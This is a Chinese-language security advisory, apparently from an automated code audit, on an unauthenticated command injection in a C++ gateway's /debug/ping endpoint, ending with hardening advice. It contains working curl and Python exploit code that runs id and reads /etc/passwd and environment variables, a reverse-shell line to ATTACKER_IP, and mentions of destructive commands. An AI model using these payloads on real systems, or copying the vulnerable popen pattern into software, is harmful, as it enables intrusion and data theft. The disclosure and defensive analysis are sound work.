# VULN-SEC-XMOD-002: 未认证调试端点存在命令注入漏洞，攻击者可通过 /debug/ping 实现远程代码执行

**严重性**: Critical | **CWE**: CWE-78 (OS 命令注入) | **置信度**: 85/100
**位置**: `src/main.cpp:64-68` @ `lambda(POST /debug/ping)`

---

## 1. 漏洞细节

本漏洞是一条完整的**未认证远程代码执行（Unauthenticated RCE）**攻击链，跨越三个模块（`http_server`、`main`、`diagnostics`），从网络数据接收到 shell 命令执行，全程无任何安全屏障。

**漏洞成因**：

1. **无认证路由**：`POST /debug/ping` 端点（`main.cpp:64-68`）未实现任何认证或授权检查。与 `/login` 端点不同，该路由处理器中没有调用 `users.authenticate()` 或任何 token/session 验证逻辑。任何能访问 8080 端口的网络客户端均可直接触发。

2. **无输入验证**：`host` 查询参数从 HTTP 请求中提取后，未经任何验证、清洗或转义，直接传递给 `Diagnostics::pingHost()`。代码库中不存在 `sanitize`、`escape`、`validate`、`filter` 等安全函数。

3. **命令注入**：`Diagnostics::pingHost()`（`diagnostics.cpp:7-22`）通过字符串拼接构造 shell 命令：`"ping -c 1 " + host`，然后传递给 `popen()`。`popen()` 内部调用 `/bin/sh -c` 执行命令，会解释所有 shell 元字符（`;`、`|`、`&&`、`$()` 等）。

**触发机制**：攻击者发送包含 shell 元字符的 `host` 参数值，即可在 `ping` 命令后注入并执行任意系统命令。例如 `host=;id` 将执行 `ping -c 1 ;id`，shell 会依次执行 `ping -c 1` 和 `id` 两条命令。

## 2. 漏洞代码

### 2.1 漏洞入口 — 无认证路由处理器

**文件**: `src/main.cpp` (行 64-68)

```cpp
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
    std::string host = queryValue(request, "host");   // ← 提取用户输入，无任何验证
    audit.event("operator", "debug-ping", host);
    return text(200, diagnostics.pingHost(host));      // ← 直接传递给 pingHost()
});
```

**对比有认证的端点**（`src/main.cpp:40-52`）：

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    // ...
    if (!users.authenticate(username, password)) {     // ← /login 有认证检查
      return text(401, "invalid credentials\n");
    }
    // ...
});
```

`/debug/ping` 完全没有类似的认证检查。

### 2.2 参数提取 — 无清洗

**文件**: `src/main.cpp` (行 13-16)

```cpp
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second;  // ← 原样返回，无转义
}
```

### 2.3 命令注入 — Shell 执行

**文件**: `src/diagnostics.cpp` (行 7-22)

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;    // ← 第8行：字符串拼接，无转义
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");     // ← 第12行：shell 执行！
  if (!pipe) {
    return "failed to start diagnostic command\n";
  }

  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();
  }
  pclose(pipe);
  return output.str();                           // ← 命令输出返回给攻击者
}
```

**关键问题**：
- 第 8 行：`host` 参数直接拼接到命令字符串，未过滤 `;`、`|`、`$()`、反引号等 shell 元字符
- 第 12 行：`popen()` 通过 `/bin/sh -c` 执行拼接后的命令，shell 会解释所有元字符
- 第 21 行：命令执行结果通过 `output.str()` 返回，最终通过 HTTP 响应发送给攻击者（带外数据泄露）

### 2.4 网络入口 — 绑定所有接口

**文件**: `src/http_server.cpp` (行 81-113)

```cpp
int HttpServer::run() {
  // ...
  address.sin_addr.s_addr = INADDR_ANY;          // ← 第92行：绑定所有网络接口
  address.sin_port = htons(static_cast<uint16_t>(port_));  // 默认端口 8080
  // ...
  ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);  // ← 第113行：接收外部输入
  // ...
  HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
  auto handler = handlers_.find(routeKey(request.method, request.path));
  // ...
  response = handler->second(request);            // ← 第127行：调用路由处理器
}
```

服务器绑定 `INADDR_ANY:8080`，接受来自任何网络接口的连接，无任何网络层访问控制。

## 3. 完整攻击链路

```
[网络入口] recv()@src/http_server.cpp:113
  ↓ TCP 数据从 INADDR_ANY:8080 接收，存入 4096 字节缓冲区
[HTTP 解析] parseRequest()@src/http_server.cpp:42
  ↓ 解析 HTTP 请求行和查询参数，host 值存入 request.query map
[查询解析] parseQuery()@src/http_server.cpp:19
  ↓ 按 '&' 和 '=' 分割查询字符串，无 URL 解码，无值验证
[路由分发] handlers_.find()@src/http_server.cpp:120
  ↓ 匹配 "POST /debug/ping"，调用对应 lambda 处理器
[参数提取] queryValue(request, "host")@src/main.cpp:65
  ↓ 从 request.query 中取出 host 值，原样返回，无任何清洗
[审计记录] audit.event()@src/main.cpp:66
  ↓ 记录操作日志（不影响执行流程，不阻断攻击）
[命令构造] "ping -c 1 " + host@src/diagnostics.cpp:8
  ↓ 字符串拼接：攻击者输入直接附加到 shell 命令后
[Shell 执行] popen(command.c_str(), "r")@src/diagnostics.cpp:12
  ↓ /bin/sh -c 解释并执行拼接后的命令，shell 元字符被解释
[结果返回] output.str() → text(200, ...) → send()@src/http_server.cpp:131
  ↓ 命令执行结果通过 HTTP 响应返回给攻击者
```

**链路完整性验证**：

| 步骤 | 源码位置 | 是否可达 | 是否有安全屏障 |
|------|---------|---------|--------------|
| 网络接收 | `http_server.cpp:113` | ✅ 是 | ❌ 无（INADDR_ANY，无防火墙代码） |
| HTTP 解析 | `http_server.cpp:42` | ✅ 是 | ❌ 无（原样解析，无输入限制） |
| 路由匹配 | `http_server.cpp:120` | ✅ 是 | ❌ 无（无认证中间件） |
| 参数提取 | `main.cpp:65` | ✅ 是 | ❌ 无（原样返回） |
| 命令拼接 | `diagnostics.cpp:8` | ✅ 是 | ❌ 无（无转义/过滤） |
| Shell 执行 | `diagnostics.cpp:12` | ✅ 是 | ❌ 无（popen 直接执行） |

**攻击链中不存在任何安全屏障**。

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者。攻击者无需任何凭据、会话令牌或特殊权限，仅需能够访问目标服务器 8080 端口的网络连通性。

**攻击向量**: HTTP POST 请求，通过 TCP 端口 8080 发送。`host` 参数可通过 URL 查询字符串传递。

**利用难度**: **低** — 仅需发送一个 HTTP 请求，无需任何特殊工具或技术知识。标准 `curl` 命令即可完成利用。

### 攻击步骤

1. **侦察**: 攻击者发现目标服务器 8080 端口开放（通过端口扫描或服务发现）
2. **探测**: 发送 `POST /debug/ping?host=127.0.0.1` 确认端点存在且可用
3. **注入测试**: 发送 `POST /debug/ping?host=;id` 验证命令注入是否可行
4. **命令执行**: 根据响应中的 `uid=` 等信息确认 RCE 成功
5. **后利用**: 利用 RCE 能力执行更危险的命令（反弹 shell、数据窃取、横向移动等）

## 5. 攻击条件

| 条件类型 | 要求 | 说明 |
|----------|------|------|
| 网络可达性 | TCP 8080 端口可达 | 服务器绑定 `INADDR_ANY:8080`（`http_server.cpp:92-93`），接受所有网络接口的连接。如果服务器部署在公网或有端口暴露，攻击者可直接访问 |
| 认证要求 | **无** | `/debug/ping` 路由无任何认证检查（`main.cpp:64-68`），不需要用户名、密码、token 或 session |
| 配置依赖 | 默认配置即可利用 | 无需特殊配置，服务器启动后该端点默认可用 |
| 环境依赖 | Linux/Unix + /bin/sh | `popen()` 依赖系统 shell，`ping` 命令需存在。大多数 Linux/Unix 系统默认满足 |
| 时序条件 | 无 | 不存在竞态条件，单次请求即可触发 |

## 6. 造成影响

| 影响维度 | 等级 | 说明 |
|----------|------|------|
| 机密性 | **高** | 攻击者可执行 `cat /etc/passwd`、`cat /etc/shadow`（如有权限）、读取应用配置文件、数据库凭据、环境变量等敏感信息。命令输出直接通过 HTTP 响应返回 |
| 完整性 | **高** | 攻击者可执行 `wget`/`curl` 下载恶意文件、修改系统配置、篡改应用数据、植入后门、创建新用户等 |
| 可用性 | **高** | 攻击者可执行 `rm -rf /`、`kill` 进程、`shutdown` 系统等破坏性命令，导致服务完全中断 |

**影响范围**: **全局** — `popen()` 执行的命令以运行该服务的系统用户身份执行。如果服务以 root 运行（在容器环境中常见），攻击者将获得完全的 root 权限。即使在非 root 用户下，也可完全控制该用户的所有资源和进程。此漏洞可作为跳板进行横向移动，攻击内网其他系统。

**CVSS 3.1 评估**: 9.8 (Critical) — 网络攻击向量、无认证、无用户交互、影响 CIA 全部三要素。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请在授权环境中使用

### PoC 1: 基本命令注入验证

```bash
# 验证命令注入 — 执行 id 命令
curl -X POST "http://TARGET:8080/debug/ping?host=;id"
```

**预期响应**: HTTP 200，响应体中包含 `uid=xxx(user) gid=xxx(group)` 等信息。

### PoC 2: 敏感文件读取

```bash
# 读取 /etc/passwd
curl -X POST "http://TARGET:8080/debug/ping?host=;cat /etc/passwd"
```

**预期响应**: HTTP 200，响应体中包含系统用户列表。

### PoC 3: 环境变量泄露

```bash
# 泄露环境变量（可能包含密钥、密码等）
curl -X POST "http://TARGET:8080/debug/ping?host=;env"
```

### PoC 4: 使用命令替换语法

```bash
# 使用 $() 语法进行命令替换
curl -X POST "http://TARGET:8080/debug/ping?host=%24(id)"
# URL 编码: %24 = $, %28 = (, %29 = )
```

**预期响应**: HTTP 200，响应体中 `ping` 的目标主机名被替换为 `id` 命令的输出。

### PoC 5: 完整 Python 利用脚本

```python
#!/usr/bin/env python3
"""
VULN-SEC-XMOD-002 PoC — 仅供安全测试使用
未认证 RCE via POST /debug/ping 命令注入
"""
import sys
import urllib.parse
import http.client

def exploit(target_host, target_port, command):
    """通过 /debug/ping 端点执行任意命令"""
    # 构造注入 payload: ;command
    payload = f";{command}"
    
    conn = http.client.HTTPConnection(target_host, target_port, timeout=10)
    path = f"/debug/ping?host={urllib.parse.quote(payload)}"
    
    conn.request("POST", path)
    response = conn.getresponse()
    body = response.read().decode("utf-8", errors="replace")
    conn.close()
    
    print(f"[*] 状态码: {response.status}")
    print(f"[*] 命令输出:\n{body}")
    return body

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <目标IP> <端口> [命令]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 8080 id")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 执行命令: {cmd}")
    exploit(host, port, cmd)
```

**使用说明**:

```bash
# 基本验证
python3 poc.py 192.168.1.100 8080 id

# 读取敏感文件
python3 poc.py 192.168.1.100 8080 "cat /etc/passwd"

# 反弹 shell（仅供演示，实际使用需替换攻击者 IP）
python3 poc.py 192.168.1.100 8080 "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**预期结果**: 目标服务器执行注入的命令，命令输出通过 HTTP 响应体返回给攻击者。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux (Ubuntu 20.04+ / Debian 11+ / 任何支持 `ping` 命令的 Linux 发行版)
- **编译器**: GCC 7+ 或 Clang 5+（支持 C++17）
- **依赖**: 标准 C++ 库、POSIX socket API、`ping` 命令（`iputils-ping` 包）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 使用 CMake 构建（如果项目提供 CMakeLists.txt）
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或直接编译
g++ -std=c++17 -I include -o edge-gateway \
    src/main.cpp src/http_server.cpp src/diagnostics.cpp \
    src/user_store.cpp src/file_cache.cpp src/audit_log.cpp
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需特殊配置文件或环境变量。服务启动后自动监听指定端口。

### 验证步骤

1. 启动 `edge-gateway` 服务
2. 在另一终端执行：`curl -X POST "http://localhost:8080/debug/ping?host=;id"`
3. 检查响应体中是否包含 `uid=` 信息
4. 执行 `curl -X POST "http://localhost:8080/debug/ping?host=;whoami"` 确认命令执行身份
5. 执行 `curl -X POST "http://localhost:8080/debug/ping?host=;cat /etc/passwd"` 验证文件读取能力

### 预期结果

- 步骤 3: 响应体包含当前用户的 uid/gid 信息，例如 `uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)`
- 步骤 4: 响应体包含运行服务的用户名
- 步骤 5: 响应体包含 `/etc/passwd` 文件内容
- 所有请求均返回 HTTP 200，无需任何认证信息

### 安全加固建议

1. **立即移除或保护 `/debug/ping` 端点**：生产环境中不应暴露调试端点。如必须保留，应添加严格的认证和授权检查
2. **避免使用 `popen()`**：改用 `execve()` 系列函数直接执行 `ping` 命令，避免 shell 解释元字符
3. **输入验证**：对 `host` 参数进行严格的白名单验证（仅允许 IP 地址和合法域名格式）
4. **网络层防护**：将调试端点限制为仅本地访问（绑定 `127.0.0.1` 而非 `INADDR_ANY`），或通过防火墙规则限制访问来源
5. **最小权限原则**：确保服务以最低权限用户运行，考虑使用 seccomp/AppArmor 限制可执行的系统调用
